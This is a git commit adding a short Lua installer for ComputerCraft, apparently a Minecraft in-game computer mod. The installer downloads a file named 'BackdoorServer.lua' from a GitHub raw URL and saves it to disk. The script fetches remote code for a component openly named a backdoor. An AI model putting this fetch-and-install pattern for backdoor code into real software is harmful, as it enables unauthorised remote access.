49eaeecb4f19ab39aa32331f0cd6c046f9424737
haawwkeye <connorbishop53@gmail.com>
2022-07-22 16:25:02 -0400

    Add Install Server script

---
+++ InstallServer.lua
@@ -0,0 +1,17 @@
+print('Downloading BackdoorServer.lua...')
+ 
+local url ='https://raw.githubusercontent.com/haawwkeye/ComputerCraft_Scripts/Ame/BackdoorServer.lua'
+local h = http.get(url)
+if not h then
+  error('Failed to download script')
+end
+ 
+local contents = h.readAll()
+if not contents then
+  error('Failed to get contents of script')
+end
+ 
+local file = fs.open("BackdoorServer.lua", "w");
+file.write(contents);
+file.close();
+h.close();
